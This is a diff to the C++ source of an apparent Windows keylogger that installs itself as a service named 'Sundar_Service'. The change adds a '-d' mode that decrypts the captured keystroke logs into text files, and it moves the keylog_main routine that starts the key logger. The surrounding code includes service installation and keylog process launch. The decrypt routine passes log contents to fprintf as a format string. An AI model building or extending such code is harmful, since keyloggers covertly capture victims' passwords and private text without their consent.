@@ -7,16 +7,18 @@
 #include "ServiceManager.h"
 #include "tlhelp32.h"
 #include "Logger.h"
+#include "SecurityTool.h"
+
 #include  <io.h>
 #include  <stdio.h>
 #include  <stdlib.h>
-
 
 #define		MAX_NUM_OF_PROCESS		4
 /** Window Service **/
 void service_main();
 void installer_main();
 void keylog_main();
+void decrypt_main(char*);
 
 void WINAPI service_proc(DWORD dwArgc, LPTSTR *lpszArgv);
 void WINAPI service_handler(DWORD fdwControl);
@@ -63,6 +65,15 @@ int WINAPI _tWinMain(
 			keylog_main();
 			return 0;
 		}
+		if(strncmp(lpCmdLine, "-d ", 3) == 0 && strlen(lpCmdLine) > 3){
+			Logger::debug("Decrypt Mode");
+			decrypt_main(lpCmdLine + 3);
+			return 0;
+		}
+		if(strlen(lpCmdLine) > 0){
+			Logger::debug("Invalid Argument");
+			return 0;
+		}
 		strcpy(service_name,"Sundar_Service");	
 		DWORD size = GetModuleFileName(NULL, exe_path, sizeof(exe_path));
 		exe_path[size] = 0;
@@ -76,6 +87,35 @@ int WINAPI _tWinMain(
 			installer_main();
 		}
 		return 0;
+}
+
+void keylog_main(){
+	klm.init(GetCurrentThreadId());
+	klm.start();
+}
+
+void decrypt_main(char* path){
+	FILE* fp = fopen(path, "r");
+	if(!fp){
+		Logger::debug("Open %s Fail", path);
+		return;
+	}
+	std::string wpath(path);
+	wpath.append(".txt");
+	FILE* wfp = fopen(wpath.c_str(), "w");
+	if(!wfp){
+		Logger::debug("Open %s Fail", wpath.c_str());
+		return;
+	}
+	char buf[SecurityTool::B64_SIZE] = {0};
+	while(fread(buf, sizeof(buf), 1, fp) > 0){
+		std::string in(buf, sizeof(buf)), out;
+		SecurityTool::decrypt(in, out, SecurityTool::KEY);
+		fprintf(wfp, out.c_str());
+	}
+
+	fclose(fp);
+	fclose(wfp);
 }
 
 void installer_main(){	
@@ -127,10 +167,6 @@ VOID WINAPI service_proc(DWORD dwArgc, LPTSTR *lpszArgv)
 	start_service_busi();
 }
 
-void keylog_main(){
-	klm.init(GetCurrentThreadId());
-	klm.start();
-}
 
 bool start_keylog_proc(){
 	char cmd[512] = {0};
